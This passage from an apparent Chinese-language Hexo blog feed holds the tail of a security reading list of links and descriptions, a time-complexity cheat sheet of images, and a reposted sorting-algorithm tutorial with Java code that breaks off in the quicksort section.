class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;koutto&#x2F;hardware-hacking&#x2F;blob&#x2F;master&#x2F;Hardware-Hacking-Experiments-Jeremy-Brun-Nouvion-2020.pdfNetGear N300 WNR2000v4通过硬件提取固件</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•SSD Lil’ Bits - Episode 3 - Fuzzing &amp; Code Review</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;kkHh2bBP3g4&amp;feature&#x3D;youtu.beSSD关于fuzz以及代码审计的视频</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•iOS Application Security</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;speakerdeck.com&#x2F;vashchenko&#x2F;ios-application-securityiOS app安全研究</span><br></pre></td></tr></table></figure><p>•Jailbreaking iOS without a Mac (1/4): The Plan</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;bugbountywriteup&#x2F;jailbreaking-ios-without-a-mac-1-4-the-plan-b49c0edc1759iOS越狱系列文章第一篇</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•MS.SharePoint.CVE-2019-0604.Remote.Code.Execution</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.fortiguard.com&#x2F;encyclopedia&#x2F;ips&#x2F;47918https:&#x2F;&#x2F;securityaffairs.co&#x2F;wordpress&#x2F;98043&#x2F;hacking&#x2F;sharepoint-rce.htmlSharePoint </span><br><span class="line">CVE-2019-0604远程代码执行漏洞</span><br></pre></td></tr></table></figure><p>•A Hacker’s perspective on AEM applications security</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;speakerdeck.com&#x2F;0ang3el&#x2F;a-hackers-perspective-on-aem-applications-securityadaptTo 2020安全大会上《从黑客的角度看AdobeExperienceManager应用安全》slide</span><br></pre></td></tr></table></figure><h3 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h3><p>•checksec.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Wenzel&#x2F;checksec.py</span><br><span class="line">跨平台支持多架构的&#96;checksec&#96;工具</span><br></pre></td></tr></table></figure><p>•rasengan - extract various firmware blobs from iBoot</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;b1n4r1b01&#x2F;rasengan</span><br><span class="line">从iBoot提取固件的工具rasengan</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•Programming with the PowerPC branch processor</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ibm.com&#x2F;developerworks&#x2F;library&#x2F;l-powasm3&#x2F;index.html</span><br><span class="line">PowerPC branch processor 编程</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时间复杂度总结</title>
      <link href="/2020/09/29/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>/2020/09/29/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="时间复杂度总结"><a href="#时间复杂度总结" class="headerlink" title="时间复杂度总结"></a>时间复杂度总结</h1><h3 id="复杂度差距图"><a href="#复杂度差距图" class="headerlink" title="复杂度差距图"></a>复杂度差距图</h3><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929194012340.png" alt="image-20200929194012340"></p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929194029294.png" alt="image-20200929194029294"></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929194504961.png" alt="image-20200929194504961"></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929194523351.png" alt="image-20200929194523351"></p><h3 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h3><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929194513720.png" alt="image-20200929194513720"></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)排序算法知识点集合</title>
      <link href="/2020/09/29/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E7%9F%A5%E8%AF%86%E7%82%B9%E9%9B%86%E5%90%88/"/>
      <url>/2020/09/29/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E7%9F%A5%E8%AF%86%E7%82%B9%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h1 id="转载-排序算法知识点集合"><a href="#转载-排序算法知识点集合" class="headerlink" title="(转载)排序算法知识点集合"></a>(转载)排序算法知识点集合</h1><p>排序算法可以分为内部排序和外部排序，内部排序是数据记录在内存中进行排序，而外部排序是因排序的数据很大，一次不能容纳全部的排序记录，在排序过程中需要访问外存。常见的内部排序算法有：插入排序、希尔排序、选择排序、冒泡排序、归并排序、快速排序、堆排序、基数排序等。用一张图概括：</p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200929203625.jpg" alt="微信图片_20200929203625"></p><p>关于时间复杂度：</p><ol><li><p>平方阶 (O(n2)) 排序 各类简单排序：直接插入、直接选择和冒泡排序。</p></li><li><p>线性对数阶 (O(nlog2n)) 排序 快速排序、堆排序和归并排序。</p></li><li><p>O(n1+§)) 排序，§ 是介于 0 和 1 之间的常数。 希尔排序。</p></li><li><p>线性阶 (O(n)) 排序 基数排序，此外还有桶、箱排序。</p></li></ol><p>关于稳定性：</p><p>稳定的排序算法：冒泡排序、插入排序、归并排序和基数排序。</p><p>不是稳定的排序算法：选择排序、快速排序、希尔排序、堆排序。</p><p>名词解释：</p><p>n：数据规模</p><p>k：“桶”的个数</p><p>In-place：占用常数内存，不占用额外内存</p><p>Out-place：占用额外内存</p><p>稳定性：排序后 2 个相等键值的顺序和排序之前它们的顺序相同</p><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a><strong>冒泡排序</strong></h3><p>冒泡排序（Bubble Sort）也是一种简单直观的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。</p><p>作为最简单的排序算法之一，冒泡排序给我的感觉就像 Abandon 在单词书里出现的感觉一样，每次都在第一页第一位，所以最熟悉。冒泡排序还有一种优化算法，就是立一个 flag，当在一趟序列遍历中元素没有发生交换，则证明该序列已经有序。但这种改进对于提升性能来说并没有什么太大作用。</p><p><strong>1. 算法步骤</strong></p><ol><li>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</li><li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</li><li>针对所有的元素重复以上的步骤，除了最后一个。</li><li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</li></ol><p><strong>2. 动图演示</strong></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200929203639.gif" alt="微信图片_20200929203639"></p><p><strong>3. 什么时候最快</strong></p><p>当输入的数据已经是正序时（都已经是正序了，我还要你冒泡排序有何用啊）。</p><p><strong>4. 什么时候最慢</strong></p><p>当输入的数据是反序时（写一个 for 循环反序输出数据不就行了，干嘛要用你冒泡排序呢，我是闲的吗）。</p><p><strong>5. Java 代码实现</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public class BubbleSort implements IArraySort &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int[] sort(int[] sourceArray) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; 对 arr 进行拷贝，不改变参数内容</span><br><span class="line">        int[] arr &#x3D; Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        for (int i &#x3D; 1; i &lt; arr.length; i++) &#123;</span><br><span class="line">            &#x2F;&#x2F; 设定一个标记，若为true，则表示此次循环没有进行交换，也就是待排序列已经有序，排序已经完成。</span><br><span class="line">            boolean flag &#x3D; true;</span><br><span class="line"></span><br><span class="line">            for (int j &#x3D; 0; j &lt; arr.length - i; j++) &#123;</span><br><span class="line">                if (arr[j] &gt; arr[j + 1]) &#123;</span><br><span class="line">                    int tmp &#x3D; arr[j];</span><br><span class="line">                    arr[j] &#x3D; arr[j + 1];</span><br><span class="line">                    arr[j + 1] &#x3D; tmp;</span><br><span class="line"></span><br><span class="line">                    flag &#x3D; false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (flag) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a><strong>选择排序</strong></h3><p>选择排序是一种简单直观的排序算法，无论什么数据进去都是 O(n²) 的时间复杂度。所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间了吧。</p><p><strong>1. 算法步骤</strong></p><ol><li>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置</li><li>再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。</li><li>重复第二步，直到所有元素均排序完毕。</li></ol><p><strong>2. 动图演示</strong></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200929203646.gif" alt="微信图片_20200929203646"></p><p><strong>3. Java 代码实现</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public class SelectionSort implements IArraySort &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int[] sort(int[] sourceArray) throws Exception &#123;</span><br><span class="line">        int[] arr &#x3D; Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 总共要经过 N-1 轮比较</span><br><span class="line">        for (int i &#x3D; 0; i &lt; arr.length - 1; i++) &#123;</span><br><span class="line">            int min &#x3D; i;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 每轮需要比较的次数 N-i</span><br><span class="line">            for (int j &#x3D; i + 1; j &lt; arr.length; j++) &#123;</span><br><span class="line">                if (arr[j] &lt; arr[min]) &#123;</span><br><span class="line">                    &#x2F;&#x2F; 记录目前能找到的最小值元素的下标</span><br><span class="line">                    min &#x3D; j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 将找到的最小值和i位置所在的值进行交换</span><br><span class="line">            if (i !&#x3D; min) &#123;</span><br><span class="line">                int tmp &#x3D; arr[i];</span><br><span class="line">                arr[i] &#x3D; arr[min];</span><br><span class="line">                arr[min] &#x3D; tmp;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a><strong>插入排序</strong></h3><p>插入排序的代码实现虽然没有冒泡排序和选择排序那么简单粗暴，但它的原理应该是最容易理解的了，因为只要打过扑克牌的人都应该能够秒懂。插入排序是一种最简单直观的排序算法，它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。</p><p>插入排序和冒泡排序一样，也有一种优化算法，叫做拆半插入。</p><p><strong>1. 算法步骤</strong></p><ol><li>将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。</li><li>从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置。（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。）</li></ol><p><strong>2. 动图演示</strong></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200929203651.gif" alt="微信图片_20200929203651"></p><p><strong>3. Java 代码实现</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public class InsertSort implements IArraySort &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int[] sort(int[] sourceArray) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; 对 arr 进行拷贝，不改变参数内容</span><br><span class="line">        int[] arr &#x3D; Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 从下标为1的元素开始选择合适的位置插入，因为下标为0的只有一个元素，默认是有序的</span><br><span class="line">        for (int i &#x3D; 1; i &lt; arr.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 记录要插入的数据</span><br><span class="line">            int tmp &#x3D; arr[i];</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 从已经排序的序列最右边的开始比较，找到比其小的数</span><br><span class="line">            int j &#x3D; i;</span><br><span class="line">            while (j &gt; 0 &amp;&amp; tmp &lt; arr[j - 1]) &#123;</span><br><span class="line">                arr[j] &#x3D; arr[j - 1];</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 存在比其小的数，插入</span><br><span class="line">            if (j !&#x3D; i) &#123;</span><br><span class="line">                arr[j] &#x3D; tmp;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a><strong>希尔排序</strong></h3><p>希尔排序，也称递减增量排序算法，是插入排序的一种更高效的改进版本。但希尔排序是非稳定排序算法。</p><p>希尔排序是基于插入排序的以下两点性质而提出改进方法的：</p><ul><li>插入排序在对几乎已经排好序的数据操作时，效率高，即可以达到线性排序的效率；</li><li>但插入排序一般来说是低效的，因为插入排序每次只能将数据移动一位；</li></ul><p>希尔排序的基本思想是：先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行依次直接插入排序。</p><p><strong>1. 算法步骤</strong></p><ol><li>选择一个增量序列 t1，t2，……，tk，其中 ti &gt; tj, tk = 1；</li><li>按增量序列个数 k，对序列进行 k 趟排序；</li><li>每趟排序，根据对应的增量 ti，将待排序列分割成若干长度为 m 的子序列，分别对各子表进行直接插入排序。仅增量因子为 1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</li></ol><p><strong>2. Java 代码实现</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public class ShellSort implements IArraySort &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int[] sort(int[] sourceArray) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; 对 arr 进行拷贝，不改变参数内容</span><br><span class="line">        int[] arr &#x3D; Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        int gap &#x3D; 1;</span><br><span class="line">        while (gap &lt; arr.length) &#123;</span><br><span class="line">            gap &#x3D; gap * 3 + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while (gap &gt; 0) &#123;</span><br><span class="line">            for (int i &#x3D; gap; i &lt; arr.length; i++) &#123;</span><br><span class="line">                int tmp &#x3D; arr[i];</span><br><span class="line">                int j &#x3D; i - gap;</span><br><span class="line">                while (j &gt;&#x3D; 0 &amp;&amp; arr[j] &gt; tmp) &#123;</span><br><span class="line">                    arr[j + gap] &#x3D; arr[j];</span><br><span class="line">                    j -&#x3D; gap;</span><br><span class="line">                &#125;</span><br><span class="line">                arr[j + gap] &#x3D; tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            gap &#x3D; (int) Math.floor(gap &#x2F; 3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a><strong>归并排序</strong></h3><p>归并排序（Merge sort）是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。</p><p>作为一种典型的分而治之思想的算法应用，归并排序的实现由两种方法：</p><ul><li>自上而下的递归（所有递归的方法都可以用迭代重写，所以就有了第 2 种方法）；</li><li>自下而上的迭代；</li></ul><p>在《数据结构与算法 JavaScript 描述》中，作者给出了自下而上的迭代方法。但是对于递归法，作者却认为：</p><p>However, it is not possible to do so in JavaScript, as the recursion goes too deep for the language to handle.</p><p>然而，在 JavaScript 中这种方式不太可行，因为这个算法的递归深度对它来讲太深了。</p><p>说实话，我不太理解这句话。意思是 JavaScript 编译器内存太小，递归太深容易造成内存溢出吗？还望有大神能够指教。</p><p>和选择排序一样，归并排序的性能不受输入数据的影响，但表现比选择排序好的多，因为始终都是 O(nlogn) 的时间复杂度。代价是需要额外的内存空间。</p><p><strong>1. 算法步骤</strong></p><ol><li>申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列；</li><li>设定两个指针，最初位置分别为两个已经排序序列的起始位置；</li><li>比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置；</li><li>重复步骤 3 直到某一指针达到序列尾；</li><li>将另一序列剩下的所有元素直接复制到合并序列尾。</li></ol><p><strong>2. 动图演示</strong></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200929203657.gif" alt="微信图片_20200929203657"></p><p><strong>3. Java 代码实现</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">public class MergeSort implements IArraySort &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int[] sort(int[] sourceArray) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; 对 arr 进行拷贝，不改变参数内容</span><br><span class="line">        int[] arr &#x3D; Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        if (arr.length &lt; 2) &#123;</span><br><span class="line">            return arr;</span><br><span class="line">        &#125;</span><br><span class="line">        int middle &#x3D; (int) Math.floor(arr.length &#x2F; 2);</span><br><span class="line"></span><br><span class="line">        int[] left &#x3D; Arrays.copyOfRange(arr, 0, middle);</span><br><span class="line">        int[] right &#x3D; Arrays.copyOfRange(arr, middle, arr.length);</span><br><span class="line"></span><br><span class="line">        return merge(sort(left), sort(right));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected int[] merge(int[] left, int[] right) &#123;</span><br><span class="line">        int[] result &#x3D; new int[left.length + right.length];</span><br><span class="line">        int i &#x3D; 0;</span><br><span class="line">        while (left.length &gt; 0 &amp;&amp; right.length &gt; 0) &#123;</span><br><span class="line">            if (left[0] &lt;&#x3D; right[0]) &#123;</span><br><span class="line">                result[i++] &#x3D; left[0];</span><br><span class="line">                left &#x3D; Arrays.copyOfRange(left, 1, left.length);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                result[i++] &#x3D; right[0];</span><br><span class="line">                right &#x3D; Arrays.copyOfRange(right, 1, right.length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while (left.length &gt; 0) &#123;</span><br><span class="line">            result[i++] &#x3D; left[0];</span><br><span class="line">            left &#x3D; Arrays.copyOfRange(left, 1, left.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while (right.length &gt; 0) &#123;</span><br><span class="line">            result[i++] &#x3D; right[0];</span><br><span class="line">            right &#x3D; Arrays.copyOfRange(right, 1, right.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a><strong>快速排序</strong></h3><p>快速排序是由东尼·霍尔所发展的一种排序算法。在平均状况下，排序 n 个项目要 Ο(nlogn) 次比较。在最坏状况下则需要 Ο(n2) 次比较，但这种状况并不常见。事实上，快速排序通常明显比其他 Ο(nlogn) 算法更快，因为它的内部循环（inner loop）可以在大部分的架构上很有效率地被实现出来。</p><p>快速排序使用分治法（Divide and conquer）策略来把一个串行（list）分为两个子串行（sub-lists）。</p><p>快速排序又是一种分而治之思想在排序算法上的典型应用。本质上来看，快速排序应该算是在冒泡排序基础上的递归分治法。</p><p>快速排序的名字起的是简单粗暴，因为一听到这个名字你就知道它存在的意义，就是快，而且效率高！它是处理大数据最快的排序算法之一了。虽然 Worst Case 的时间复杂度达到了 O(n²)，但是人家就是优秀，在大多数情况下都比平均时间复杂度为 O(n logn) 的排序算法表现要更好，可是这是为什么呢，我也不知道。好在我的强迫症又犯了，查了 N 多资料终于在《算法艺术与信息学竞赛》上找到了满意的答案：</p><p>快速排序的最坏运行情况是 O(n²)，比如说顺序数列的快排。但它的平摊期望时间是 O(nlogn)，且 O(nlogn) 记号中隐含的常数因子很小，比复杂度稳定等于 O(nlogn) 的归并排序要小很多。所以，对绝大多数顺序性较弱的随机数列而言，快速排序总是优于归并排序。</p><p><strong>1. 算法步骤</strong></p><ol><li>从数列中挑出一个元素，称为 “基准”（pivot）;</li><li>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；</li><li>递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序；</li></ol><p>递归的最底部情形，是数列的大小是零或一，也就是永远都已经被排序好了。虽然一直递归下去，但是这个算法总会退出，因为在每次的迭代（iteration）中，它至少会把一个元素摆到它最后的位置去。</p><p><strong>2. 动图演示</strong></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200929203703.gif" alt="微信图片_20200929203703"></p><p><strong>3. Java 代码实现</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">public class QuickSort implements IArraySort &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int[] sort(int[] sourceArray) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; 对 arr 进行拷贝，不改变参数内容</span><br><span class="line">        int[] arr &#x3D; Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        return quickSort(arr, 0, arr.length - 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private int[] quickSort(int[] arr, int left, int right) &#123;</span><br><span class="line">        if (left &lt; right) &#123;</span><br><span class="line">            int partitionIndex &#x3D; partition(arr, left, right);</span><br><span class="line">            quickSort(arr, left, partitionIndex - 1);</span><br><span class="line">            quickSort(arr, partitionIndex + 1, right);</span><br><span class="line">        &#125;</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private int partition(int[] arr, int left, int right) &#123;</span><br><span class="line">        